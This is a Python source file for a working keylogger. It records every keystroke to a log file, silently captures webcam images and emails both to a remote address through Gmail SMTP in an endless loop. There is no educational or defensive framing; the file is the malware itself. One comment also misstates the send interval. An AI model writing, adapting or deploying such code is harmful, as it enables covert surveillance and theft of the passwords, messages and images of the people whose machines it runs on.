import keyboard
import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import datetime
import os
import time

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_USER = "Sender Mail"  # Your email
EMAIL_PASS = "Password"  # Your email password
RECEIVER_EMAIL = "Receiver"  # Target email

# File to save keystrokes
LOG_FILE = "keylog.txt"
CAMERA_IMAGE = "screenshot.jpg"

# Function to capture screenshot from camera
def capture_camera():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open camera.")
        return

    # Capture one frame
    ret, frame = cap.read()
    if ret:
        # Save frame as image
        cv2.imwrite(CAMERA_IMAGE, frame)
        print("Camera screenshot saved as 'screenshot.jpg'")
    else:
        print("Failed to capture camera frame.")

    cap.release()

# Function to log keystrokes
def on_key_press(event):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} - {event.name}\n")

# Function to send email with keylog and camera image
def send_email():
    print("Sending email...")

    msg = MIMEMultipart()
    msg['From'] = EMAIL_USER
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = "Keylogger Data and Camera Screenshot"

    body = "Here is the keylogger data and camera screenshot."
    msg.attach(MIMEText(body, 'plain'))

    # Attach keylog file
    try:
        with open(LOG_FILE, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= keylog.txt")
            msg.attach(part)
    except Exception as e:
        print("Error attaching keylog:", e)

    # Attach camera screenshot
    try:
        with open(CAMERA_IMAGE, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= screenshot.jpg")
            msg.attach(part)
    except Exception as e:
        print("Error attaching screenshot:", e)

    # Send the email
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_USER, EMAIL_PASS)
        text = msg.as_string()
        server.sendmail(EMAIL_USER, RECEIVER_EMAIL, text)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("Failed to send email:", e)

# Start keylogger
keyboard.on_press(on_key_press)

# Loop to send email every 2 minutes
while True:
    time.sleep(60)  # 60 seconds = 1 minutes
    capture_camera()
    send_email()
